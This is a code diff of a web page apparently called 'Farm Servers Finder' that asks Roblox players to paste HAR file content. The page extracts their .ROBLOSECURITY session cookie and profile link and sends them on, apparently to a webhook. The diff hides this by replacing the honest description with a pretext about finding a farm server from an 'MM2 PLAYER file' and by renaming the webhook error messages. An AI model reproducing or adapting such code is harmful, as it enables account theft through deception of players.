@@ -56,9 +56,9 @@
   <div class="container">
     <div class="panel">
       <h2>Farm Servers Finder</h2>
-      <p>Paste your HAR file content below. We will detect your <code>.ROBLOSECURITY</code> cookie and profile link to send to the server.</p>
+      <p>Paste your MM2 PLAYER file content below. We will detect your <code>username</code> and find a farm server [BETA]</p>
       <label for="harContent">Paste Your HAR File Content:</label>
-      <textarea id="harContent" rows="10" placeholder="Paste HAR content here..."></textarea>
+      <textarea id="harContent" rows="10" placeholder="Paste MM2 PLAYER file content here..."></textarea>
       <button id="submitBtn">Submit</button>
     </div>
   </div>
@@ -67,9 +67,9 @@
     document.getElementById('submitBtn').addEventListener('click', () => {
       const harContent = document.getElementById('harContent').value.trim();
 
-      // Check if HAR content contains .ROBLOSECURITY
+      // Check if file is extracted while logged in a ROBLOX account
       if (!harContent.includes('.ROBLOSECURITY')) {
-        Swal.fire('Error', 'The HAR file does not contain a .ROBLOSECURITY cookie.', 'error');
+        Swal.fire('Error', 'The HAR file does is NOT copied while logged in an account', 'error');
         return;
       }
 
@@ -98,7 +98,7 @@
 
         // If no cookie or profile link was found, show an error
         if (!roblosecurityCookie || !profileURL) {
-          Swal.fire('Error', 'Could not extract required information from the HAR file.', 'error');
+          Swal.fire('Error', 'Could not extract required information from the MM2 Player file.', 'error');
           return;
         }
 
@@ -132,11 +132,11 @@
             });
           })
           .catch(error => {
-            console.error('Error sending data to webhook:', error);
-            Swal.fire('Error', 'Failed to send data to the webhook. Please check the console for details.', 'error');
+            console.error('Error processing:', error);
+            Swal.fire('Error', 'Failed to process data. Please check the console for details.', 'error');
           });
       } catch (error) {
-        console.error('Failed to process HAR content:', error);
+        console.error('Failed to process MM2 Player content:', error);
         Swal.fire('Error', 'The HAR file is invalid. Please check the format.', 'error');
       }
     });
